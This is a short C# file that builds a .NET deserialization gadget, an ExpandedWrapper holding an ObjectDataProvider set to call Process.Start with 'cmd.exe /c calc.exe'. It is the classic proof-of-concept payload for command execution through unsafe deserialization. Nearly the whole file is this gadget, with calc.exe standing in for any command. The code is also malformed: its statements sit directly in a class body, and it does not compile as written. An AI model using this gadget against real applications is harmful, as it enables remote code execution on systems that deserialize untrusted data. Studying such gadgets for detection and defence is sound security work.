using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace Expended_ODP_gadget
{
	class test
	{
		ExpendedWrapper<Process, ObjectDataProvider> pay = new ExpendedWrapper<Process, ObjectDataProvider>();
		pay.ProjectedProperty0 = new ObjectDataProvider();
		pay.ProjectedProperty0.ObjectInstance = new Process();
		pay.ProjectedProperty0.MethodParameters.Add("cmd.exe");
		pay.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
		pay.ProjectedProperty0.MethodName = "Start";
	}
}
